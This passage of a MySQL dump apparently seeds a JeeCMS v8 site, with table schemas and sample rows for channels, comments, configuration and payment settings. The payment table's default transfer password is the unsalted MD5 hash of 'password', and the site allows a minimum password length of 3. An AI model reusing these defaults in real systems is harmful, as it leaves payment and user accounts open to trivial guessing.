  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图高度',
  `comment_control` int(11) NOT NULL DEFAULT '0' COMMENT '评论(0:匿名;1:会员一次;2:关闭,3会员多次)',
  `allow_updown` tinyint(1) NOT NULL DEFAULT '1' COMMENT '顶踩(true:开放;false:关闭)',
  `is_blank` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否新窗口打开',
  `title` varchar(255) DEFAULT NULL COMMENT 'TITLE',
  `keywords` varchar(255) DEFAULT NULL COMMENT 'KEYWORDS',
  `description` varchar(255) DEFAULT NULL COMMENT 'DESCRIPTION',
  `allow_share` tinyint(1) NOT NULL DEFAULT '0' COMMENT '分享(true:开放;false:关闭)',
  `allow_score` tinyint(1) NOT NULL DEFAULT '0' COMMENT '评分(true:开放;false:关闭)',
  `tpl_mobile_channel` varchar(100) DEFAULT NULL COMMENT '手机栏目页模板',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_ext_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目内容表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel_ext`
--

LOCK TABLES `jc_channel_ext` WRITE;
/*!40000 ALTER TABLE `jc_channel_ext` DISABLE KEYS */;
INSERT INTO `jc_channel_ext` VALUES (75,'新闻',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/news.html',NULL,NULL,NULL,0,0,510,288,310,310,0,1,0,NULL,NULL,NULL,1,1,'/WEB-INF/t/cms/www/mobile/channel/news.html'),(76,'图库',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,510,288,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(77,'视频',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,510,288,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(78,'下载',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(79,'招聘',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(80,'网络调查',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/alone/alone_survey.html',NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'/WEB-INF/t/cms/www/mobile/alone/alone_survey.html.html'),(82,'留言板',NULL,NULL,'0','0','0','0',10,NULL,NULL,'/guestbook.jspx',NULL,NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(90,'系统软件',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_child.html',NULL,NULL,NULL,1,1,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(91,'媒体助手',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_child.html',NULL,NULL,NULL,1,1,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(92,'精品推荐',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_recommend.html',NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,''),(93,'游戏娱乐',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_child.html',NULL,NULL,NULL,1,1,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
/*!40000 ALTER TABLE `jc_channel_ext` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel_model`
--

DROP TABLE IF EXISTS `jc_channel_model`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel_model` (
  `channel_id` int(11) NOT NULL,
  `model_id` int(11) NOT NULL COMMENT '模型id',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  PRIMARY KEY (`channel_id`,`priority`),
  KEY `fk_jc_model_channel_m` (`model_id`),
  CONSTRAINT `fk_jc_channel_model_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_model_channel_m` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='栏目可选内容模型表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel_model`
--

LOCK TABLES `jc_channel_model` WRITE;
/*!40000 ALTER TABLE `jc_channel_model` DISABLE KEYS */;
INSERT INTO `jc_channel_model` VALUES (75,1,'/WEB-INF/t/cms/www/default/content/news2.html',0,'/WEB-INF/t/cms/www/mobile/content/news.html'),(76,5,'',0,''),(77,6,'',0,''),(79,8,'',0,''),(90,4,'',0,''),(91,4,'',0,''),(92,4,'',0,''),(93,4,'',0,'');
/*!40000 ALTER TABLE `jc_channel_model` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel_txt`
--

DROP TABLE IF EXISTS `jc_channel_txt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel_txt` (
  `channel_id` int(11) NOT NULL,
  `txt` longtext COMMENT '栏目内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_txt_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目文本表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel_txt`
--

LOCK TABLES `jc_channel_txt` WRITE;
/*!40000 ALTER TABLE `jc_channel_txt` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_channel_txt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_channel_user`
--

DROP TABLE IF EXISTS `jc_channel_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_channel_user` (
  `channel_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`user_id`),
  KEY `fk_jc_channel_user` (`user_id`),
  CONSTRAINT `fk_jc_channel_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目用户关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_channel_user`
--

LOCK TABLES `jc_channel_user` WRITE;
/*!40000 ALTER TABLE `jc_channel_user` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_channel_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_chnl_group_contri`
--

DROP TABLE IF EXISTS `jc_chnl_group_contri`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_chnl_group_contri` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_c` (`group_id`),
  CONSTRAINT `fk_jc_channel_group_c` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_channel_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目投稿会员组关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_chnl_group_contri`
--

LOCK TABLES `jc_chnl_group_contri` WRITE;
/*!40000 ALTER TABLE `jc_chnl_group_contri` DISABLE KEYS */;
INSERT INTO `jc_chnl_group_contri` VALUES (75,1),(76,1),(77,1),(79,1),(75,2),(76,2),(77,2),(79,2),(75,3),(76,3),(77,3),(79,3);
/*!40000 ALTER TABLE `jc_chnl_group_contri` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_chnl_group_view`
--

DROP TABLE IF EXISTS `jc_chnl_group_view`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_chnl_group_view` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_v` (`group_id`),
  CONSTRAINT `fk_jc_channel_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_channel_v` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目浏览会员组关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_chnl_group_view`
--

LOCK TABLES `jc_chnl_group_view` WRITE;
/*!40000 ALTER TABLE `jc_chnl_group_view` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_chnl_group_view` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_comment`
--

DROP TABLE IF EXISTS `jc_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `comment_user_id` int(11) DEFAULT NULL COMMENT '评论用户ID',
  `reply_user_id` int(11) DEFAULT NULL COMMENT '回复用户ID',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `create_time` datetime NOT NULL COMMENT '评论时间',
  `reply_time` datetime DEFAULT NULL COMMENT '回复时间',
  `ups` smallint(6) NOT NULL DEFAULT '0' COMMENT '支持数',
  `downs` smallint(6) NOT NULL DEFAULT '0' COMMENT '反对数',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `score` int(11) DEFAULT NULL COMMENT '评分',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级评论',
  `reply_count` int(11) DEFAULT '0' COMMENT '回复数',
  PRIMARY KEY (`comment_id`),
  KEY `fk_jc_comment_content` (`content_id`),
  KEY `fk_jc_comment_reply` (`reply_user_id`),
  KEY `fk_jc_comment_site` (`site_id`),
  KEY `fk_jc_comment_user` (`comment_user_id`),
  CONSTRAINT `fk_jc_comment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_comment_reply` FOREIGN KEY (`reply_user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_comment_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_comment_user` FOREIGN KEY (`comment_user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COMMENT='CMS评论表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_comment`
--

LOCK TABLES `jc_comment` WRITE;
/*!40000 ALTER TABLE `jc_comment` DISABLE KEYS */;
INSERT INTO `jc_comment` VALUES (11,NULL,NULL,30,1,'2016-10-10 08:50:25',NULL,0,0,1,1,NULL,NULL,0),(13,NULL,NULL,39,1,'2016-10-10 08:56:21',NULL,0,0,1,1,NULL,NULL,0),(14,NULL,NULL,130,1,'2016-10-10 14:00:12',NULL,0,0,1,1,NULL,NULL,0),(15,NULL,NULL,132,1,'2016-10-10 14:01:13',NULL,0,0,1,1,NULL,NULL,0);
/*!40000 ALTER TABLE `jc_comment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_comment_ext`
--

DROP TABLE IF EXISTS `jc_comment_ext`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_comment_ext` (
  `comment_id` int(11) NOT NULL,
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `text` longtext COMMENT '评论内容',
  `reply` longtext COMMENT '回复内容',
  KEY `fk_jc_ext_comment` (`comment_id`),
  CONSTRAINT `fk_jc_ext_comment` FOREIGN KEY (`comment_id`) REFERENCES `jc_comment` (`comment_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS评论扩展表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_comment_ext`
--

LOCK TABLES `jc_comment_ext` WRITE;
/*!40000 ALTER TABLE `jc_comment_ext` DISABLE KEYS */;
INSERT INTO `jc_comment_ext` VALUES (11,'117.41.152.66','早就该这样了，不知道多少不法分子利用不实名手机号进行诈骗。',''),(13,'117.41.152.66','四川人民伤不起，忘国家加紧开展救援以及灾后重建工作。',''),(14,'117.41.152.66','保持定力：坚持走中国特色解决民族问题的正确道路',''),(15,'117.41.152.66','燃烧吧小宇宙，中国大妈征服世界，哈哈哈哈...','');
/*!40000 ALTER TABLE `jc_comment_ext` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_config`
--

DROP TABLE IF EXISTS `jc_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_config` (
  `config_id` int(11) NOT NULL,
  `context_path` varchar(20) DEFAULT '/JeeCms' COMMENT '部署路径',
  `servlet_point` varchar(20) DEFAULT NULL COMMENT 'Servlet挂载点',
  `port` int(11) DEFAULT NULL COMMENT '端口',
  `db_file_uri` varchar(50) NOT NULL DEFAULT '/dbfile.svl?n=' COMMENT '数据库附件访问地址',
  `is_upload_to_db` tinyint(1) NOT NULL DEFAULT '0' COMMENT '上传附件至数据库',
  `def_img` varchar(255) NOT NULL DEFAULT '/JeeCms/r/cms/www/default/no_picture.gif' COMMENT '图片不存在时默认图片',
  `login_url` varchar(255) NOT NULL DEFAULT '/login.jspx' COMMENT '登录地址',
  `process_url` varchar(255) DEFAULT NULL COMMENT '登录后处理地址',
  `mark_on` tinyint(1) NOT NULL DEFAULT '1' COMMENT '开启图片水印',
  `mark_width` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小宽度',
  `mark_height` int(11) NOT NULL DEFAULT '120' COMMENT '图片最小高度',
  `mark_image` varchar(100) DEFAULT '/r/cms/www/watermark.png' COMMENT '图片水印',
  `mark_content` varchar(100) NOT NULL DEFAULT 'www.jeecms.com' COMMENT '文字水印内容',
  `mark_size` int(11) NOT NULL DEFAULT '20' COMMENT '文字水印大小',
  `mark_color` varchar(10) NOT NULL DEFAULT '#FF0000' COMMENT '文字水印颜色',
  `mark_alpha` int(11) NOT NULL DEFAULT '50' COMMENT '水印透明度（0-100）',
  `mark_position` int(11) NOT NULL DEFAULT '1' COMMENT '水印位置(0-5)',
  `mark_offset_x` int(11) NOT NULL DEFAULT '0' COMMENT 'x坐标偏移量',
  `mark_offset_y` int(11) NOT NULL DEFAULT '0' COMMENT 'y坐标偏移量',
  `count_clear_time` date NOT NULL COMMENT '计数器清除时间',
  `count_copy_time` datetime NOT NULL COMMENT '计数器拷贝时间',
  `download_code` varchar(32) NOT NULL DEFAULT 'jeecms' COMMENT '下载防盗链md5混淆码',
  `download_time` int(11) NOT NULL DEFAULT '12' COMMENT '下载有效时间（小时）',
  `email_host` varchar(50) DEFAULT NULL COMMENT '邮件发送服务器',
  `email_encoding` varchar(20) DEFAULT NULL COMMENT '邮件发送编码',
  `email_username` varchar(100) DEFAULT NULL COMMENT '邮箱用户名',
  `email_password` varchar(100) DEFAULT NULL COMMENT '邮箱密码',
  `email_personal` varchar(100) DEFAULT NULL COMMENT '邮箱发件人',
  `email_validate` tinyint(1) DEFAULT '0' COMMENT '开启邮箱验证',
  `view_only_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '只有终审才能浏览内容页',
  `flow_clear_time` date NOT NULL COMMENT '流量统计清除时间',
  `channel_count_clear_time` date NOT NULL COMMENT '栏目发布内容计数器清除时间',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_config`
--

LOCK TABLES `jc_config` WRITE;
/*!40000 ALTER TABLE `jc_config` DISABLE KEYS */;
INSERT INTO `jc_config` VALUES (1,'/jeecms',NULL,8080,'/dbfile.svl?n=',0,'/r/cms/www/no_picture.gif','/login.jspx',NULL,0,120,120,'/r/cms/www/watermark.png','www.jeecms.com',40,'#FF0000',100,1,0,0,'2017-04-11','2017-04-11 16:47:16','jeecms',12,NULL,NULL,NULL,NULL,NULL,0,0,'2017-04-11','2016-10-13');
/*!40000 ALTER TABLE `jc_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_config_attr`
--

DROP TABLE IF EXISTS `jc_config_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_config_attr` (
  `config_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_config` (`config_id`),
  CONSTRAINT `fk_jc_attr_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置属性表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_config_attr`
--

LOCK TABLES `jc_config_attr` WRITE;
/*!40000 ALTER TABLE `jc_config_attr` DISABLE KEYS */;
INSERT INTO `jc_config_attr` VALUES (1,'password_min_len','3'),(1,'username_reserved',''),(1,'register_on','true'),(1,'member_on','true'),(1,'username_min_len','5'),(1,'version','jeecms-v8'),(1,'user_img_height','98'),(1,'user_img_width','143'),(1,'check_on','false'),(1,'new_picture','/r/cms/www/new.gif'),(1,'day','3'),(1,'preview','false'),(1,'qqEnable','false'),(1,'sinaKey',''),(1,'sinaEnable','false'),(1,'qqID','101139646'),(1,'qqKey',''),(1,'sinaID','2510334929'),(1,'qqWeboEnable','false'),(1,'qqWeboKey',''),(1,'qqWeboID','801526383'),(1,'ssoEnable','false'),(1,'flowSwitch','true'),(1,'contentFreshMinute','0'),(1,'codeImgWidth','160'),(1,'codeImgHeight','160');
/*!40000 ALTER TABLE `jc_config_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_config_content_charge`
--

DROP TABLE IF EXISTS `jc_config_content_charge`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_config_content_charge` (
  `config_content_id` int(11) NOT NULL DEFAULT '1',
  `weixin_appid` varchar(255) NOT NULL DEFAULT '' COMMENT '微信服务号APPID',
  `weixin_secret` varchar(50) NOT NULL DEFAULT '' COMMENT '微信公众号secret',
  `weixin_account` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户号',
  `weixin_password` varchar(255) NOT NULL DEFAULT '' COMMENT '微信支付商户密钥',
  `alipay_partner_id` varchar(255) DEFAULT NULL COMMENT '支付宝合作者ID',
  `alipay_account` varchar(255) DEFAULT NULL COMMENT '支付宝签约账户',
  `alipay_key` varchar(1000) DEFAULT NULL COMMENT '支付宝公钥',
  `alipay_appid` varchar(255) DEFAULT NULL COMMENT '支付宝应用ID',
  `alipay_public_key` varchar(255) DEFAULT '' COMMENT '支付宝RSA公钥',
  `alipay_private_key` varchar(1000) DEFAULT NULL COMMENT '支付宝RSA私钥',
  `charge_ratio` double(5,2) NOT NULL DEFAULT '0.00' COMMENT '抽成比例',
  `min_draw_amount` double(11,2) NOT NULL DEFAULT '1.00' COMMENT '最小提现额',
  `commission_total` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成总金额',
  `commission_year` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成年金额',
  `commission_month` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成月金额',
  `commission_day` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '佣金抽成日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `pay_transfer_password` varchar(100) NOT NULL DEFAULT '5f4dcc3b5aa765d61d8327deb882cf99' COMMENT '转账支付密码（管理后台验证）',
  `transfer_api_password` varchar(100) NOT NULL DEFAULT '' COMMENT '企业转账接口API密钥',
  `reward_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  `reward_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '打赏随机数最小值',
  PRIMARY KEY (`config_content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容收费配置';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_config_content_charge`
--

LOCK TABLES `jc_config_content_charge` WRITE;
/*!40000 ALTER TABLE `jc_config_content_charge` DISABLE KEYS */;
INSERT INTO `jc_config_content_charge` VALUES (1,'1','2','3','4','1','1','1','1','1','1',0.10,1.00,0.0000,0.0000,0.0000,0.0000,'2016-10-11 03:40:48','5f4dcc3b5aa765d61d8327deb882cf99','4',0.01,1.00);
/*!40000 ALTER TABLE `jc_config_content_charge` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_config_item`
--

DROP TABLE IF EXISTS `jc_config_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_config_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型 "1":"字符串文本","2":"整型文本","3":"浮点型文本","4":"文本区","5":"日期","6":"下拉列表","7":"复选框","8":"单选框"',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填',
  `category` int(11) NOT NULL DEFAULT '1' COMMENT '模型项目所属分类（1注册模型）',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_config` (`config_id`),
  CONSTRAINT `fk_jc_item_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS配置模型项表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_config_item`
--

LOCK TABLES `jc_config_item` WRITE;
/*!40000 ALTER TABLE `jc_config_item` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_config_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content`
--

DROP TABLE IF EXISTS `jc_content`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content` (
  `content_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) NOT NULL COMMENT '栏目ID',
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `type_id` int(11) NOT NULL COMMENT '属性ID',
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `sort_date` datetime NOT NULL COMMENT '排序日期',
  `top_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '固顶级别',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有标题图',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  `status` tinyint(4) NOT NULL DEFAULT '2' COMMENT '状态(0:草稿;1:审核中;2:审核通过;3:回收站;4:投稿;5:归档)',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `score` int(11) NOT NULL DEFAULT '0' COMMENT '得分',
  `recommend_level` tinyint(4) NOT NULL DEFAULT '0' COMMENT '推荐级别',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_site` (`site_id`),
  KEY `fk_jc_content_type` (`type_id`),
  KEY `fk_jc_content_user` (`user_id`),
  KEY `fk_jc_contentchannel` (`channel_id`),
  KEY `fk_jc_content_model` (`model_id`),
  CONSTRAINT `fk_jc_content_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
  CONSTRAINT `fk_jc_content_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_content_type` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
  CONSTRAINT `fk_jc_content_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_contentchannel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=142 DEFAULT CHARSET=utf8 COMMENT='CMS内容表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content`
--

LOCK TABLES `jc_content` WRITE;
/*!40000 ALTER TABLE `jc_content` DISABLE KEYS */;
INSERT INTO `jc_content` VALUES (2,76,1,2,5,1,'2016-07-15 14:47:24',0,0,0,2,1,0,0,0,0,0),(7,76,1,2,5,1,'2016-07-15 15:33:26',0,0,1,2,17,0,0,0,0,0),(11,75,1,1,1,1,'2016-07-15 16:23:32',0,0,0,2,1,0,0,0,0,0),(12,75,1,1,1,1,'2016-07-15 17:22:47',0,0,0,2,1,0,0,0,1,0),(13,76,1,2,5,1,'2016-07-19 14:12:48',1,0,1,2,3,0,0,0,0,0),(14,75,1,2,1,1,'2016-07-19 14:26:30',0,0,0,2,21,0,0,14,13,0),(23,75,1,1,1,1,'2016-09-13 17:16:04',0,0,0,2,16,0,0,12,11,1),(27,75,1,2,1,1,'2016-09-22 16:30:13',0,0,0,2,1,0,0,2,2,1),(28,75,1,2,1,1,'2016-09-22 16:56:46',0,0,0,2,4,0,0,2,2,1),(29,75,1,1,1,1,'2016-09-23 09:07:33',0,0,0,2,1,0,0,1,1,1),(30,75,1,1,1,1,'2016-09-23 09:09:41',0,0,0,2,54,1,0,44,41,1),(32,75,1,2,1,1,'2016-09-23 09:19:38',0,0,0,2,2,0,0,1,2,1),(33,75,1,2,1,1,'2016-09-23 09:23:39',0,0,0,2,18,0,0,18,18,1),(36,75,1,2,1,1,'2016-09-23 09:40:21',0,0,0,2,0,0,0,0,0,1),(37,75,1,2,1,1,'2016-09-23 09:43:34',0,0,0,2,2,0,0,1,0,1),(39,75,1,2,1,1,'2016-09-23 09:54:17',0,0,0,2,27,1,0,17,18,1),(43,79,1,1,8,1,'2016-09-26 09:33:15',0,0,0,2,2,0,0,0,0,1),(44,79,1,1,8,1,'2016-09-26 09:34:35',0,0,0,2,1,0,0,0,0,1),(45,79,1,1,8,1,'2016-09-26 09:38:39',0,0,0,2,17,0,0,0,0,1),(46,79,1,1,8,1,'2016-09-26 09:45:02',0,0,0,2,17,0,0,0,0,1),(47,79,1,1,8,1,'2016-09-26 09:47:54',0,0,0,2,16,0,0,0,0,1),(48,79,1,1,8,1,'2016-09-26 09:50:04',0,0,0,2,2,0,0,0,0,1),(49,79,1,1,8,1,'2016-09-26 09:51:13',0,0,0,2,16,0,0,0,0,1),(50,79,1,1,8,1,'2016-09-26 09:54:56',0,0,0,2,16,0,0,0,0,1),(51,79,1,1,8,1,'2016-09-26 09:56:01',0,0,0,2,5,0,0,0,0,1),(53,77,1,2,6,1,'2016-09-26 10:19:13',0,0,0,2,1,0,0,0,0,1),(55,77,1,2,6,1,'2016-09-26 10:20:11',0,0,0,2,0,0,0,0,0,1),(57,77,1,2,6,1,'2016-09-26 10:21:19',0,0,0,2,4,0,0,0,0,1),(59,77,1,2,6,1,'2016-09-26 10:22:24',0,0,0,2,2,0,0,0,0,1),(61,77,1,2,6,1,'2016-09-26 10:29:06',0,0,0,2,1,0,0,0,0,1),(63,77,1,2,6,1,'2016-09-26 